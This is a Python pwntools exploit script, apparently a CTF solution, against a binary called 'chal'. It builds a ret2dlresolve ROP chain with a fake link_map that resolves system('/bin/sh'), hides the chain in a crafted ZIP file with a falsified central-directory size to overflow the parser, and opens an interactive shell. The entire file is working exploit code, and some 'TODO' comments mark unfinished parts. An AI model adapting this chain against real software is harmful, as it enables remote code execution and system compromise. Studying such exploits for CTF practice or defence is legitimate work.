from pwn import *

PH = b'A'

elf = context.binary = ELF('./chal')
libc = elf.libc

local = True

if local:
    io = elf.process()
else:
    host = 'localhost'
    port = 8080
    io = remote(host, port)

if args.GDB:
    gdb.attach(io, """
        b *parse_data+522
        c
    """)

###############################################################################
# ret2dlresolve
###############################################################################
rop = ROP([elf])

# Read no pie addressed in elf
resolver = elf.get_section_by_name(".plt")["sh_addr"]
buf = elf.get_section_by_name(".bss")["sh_addr"] + 0x100
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

log.info('-' * 50)
log.info(f'_dl_resolve address: {hex(resolver)}')
log.info(f'.dynsym address: {hex(SYMTAB)}')
log.info(f'.dynstr address: {hex(STRTAB)}')
log.info(f'.rel.plt address: {hex(JMPREL)}')
log.info(f'writable buffer address: {hex(buf)}')

###############################################################################
# Make fake link_map
###############################################################################
BITMAP_64 = (1 << 64) - 1

# offset between system and target_func
target_func = 'malloc'
l_addr = libc.sym['system'] - libc.sym[target_func]
log.info('-' * 50)
log.info('Making fake link_map')
log.info(f'system - {target_func} in glibc: {hex(l_addr)}')

link_map = p64(l_addr & BITMAP_64)  # l_addr
link_map += p64(0)  # fake link_list+8 is DT_JMPREL
link_map += p64(buf + 0x18)  # fake .rel.plt address

link_map += p64(buf + 0x30 - l_addr)  # rela->r_o TODO: ?
link_map += p64(7)  # rela->r_info
link_map += p64(0)  # rela->r_addend

link_map += p64(0)  # l_ns

# DT_SYMTAB, link_map + 0x38
link_map += p64(0)
link_map += p64(elf.got[target_func] - 0x8)  # fake symtab

link_map += b'/bin/sh\00'
link_map = link_map.ljust(0x68, PH)
link_map += p64(buf)  # DT_STRTAB, link_map+0x68
link_map += p64(buf + 0x38)  # DT_SYMTAB, link_map+0x70
link_map = link_map.ljust(0xf8, PH)
link_map += p64(buf + 8)  # DT_JMPREL, link_map+0xf8

log.info(f'Finish make link_map, size: {hex(len(link_map))}')

rop.read(0, buf, len(link_map))
rop.call(resolver, [0, buf + 0x48])
rop.raw(buf)
rop.raw(0)

print(rop.dump())

###############################################################################
# Make zip file
###############################################################################

# Make compressed data
comp_data = rop.chain()

# 1. Make local file header
comp_size = len(comp_data)
len_file_name = 4
len_extra_field = 0

LFH = p32(0x04034b50)
LFH += PH * 14
LFH += p32(comp_size)  # Compressed size
LFH += PH * 4
LFH += p16(len_file_name)  # length file name
LFH += p16(len_extra_field)  # length of extra field
LFH += PH * len_file_name  # file name
LFH += PH * len_extra_field  # extra field

# 2. Make Central directory file header
CDFH = p32(0x02014b50)
CDFH += PH * 16
CDFH += p32(0x40)  # Compressed size, HACKED
CDFH += PH * 4
CDFH += p16(len_file_name)  # File name length
CDFH += p16(len_extra_field)  # Extra field length
CDFH += PH * 10
CDFH += p32(0)  # Relative offset of local file header. TODO: BUG
CDFH += PH * len_file_name

# 3. Make End of central directory record (EOCD)
cd_size = len(CDFH)
# Offset of start of central directory, relative to start of archive
cd_offset = len(LFH) + len(comp_data)

EOCD = p32(0x06054b50)  # End of central directory record
EOCD += PH * 6
# Total number of central directory records
EOCD += p16(1)
# Size of central directory (bytes)
EOCD += p32(cd_size)
# Offset of start of central directory, relative to start of archive
EOCD += p32(cd_offset)
EOCD += PH * 2

zip_file = LFH + comp_data + CDFH + EOCD
size_t = len(zip_file)

payload = str(size_t).rjust(8, '0').encode()
payload += zip_file

io.send(payload)
io.send(link_map)

log.info('-' * 50)

io.interactive()
